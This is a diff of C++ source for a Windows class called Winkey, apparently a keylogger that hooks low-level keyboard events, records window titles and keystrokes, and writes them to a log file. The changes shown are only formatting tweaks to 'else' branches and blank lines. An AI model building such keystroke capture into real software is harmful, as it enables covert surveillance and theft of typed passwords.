@@ -144,6 +144,7 @@ void CALLBACK Winkey::winEventProc(
              * We will not use the result of GetWindowTextW to determine the length
              *  as it for some reason did truncate our final string
              */
+
             _windowTitle = windowTitle;
         }
     }
@@ -189,8 +190,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
             if (lastVkCodeCount > TW_MAX_SAME_VK)
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
-        else
-            lastVkCodeCount = 1; // If not reached, reset the counter
+        else lastVkCodeCount = 1; // If not reached, reset the counter
 
         lastVkCode = p->vkCode;
 
@@ -267,9 +267,7 @@ LRESULT CALLBACK Winkey::lowLevelKeyboardProc(
             buffer[result] = L'\0';
             _keyStroke = buffer;
         }
-        else
-            _keyStroke = getKeyName(p->vkCode);
-        ;
+        else _keyStroke = getKeyName(p->vkCode);
 
         logToFile();
     }
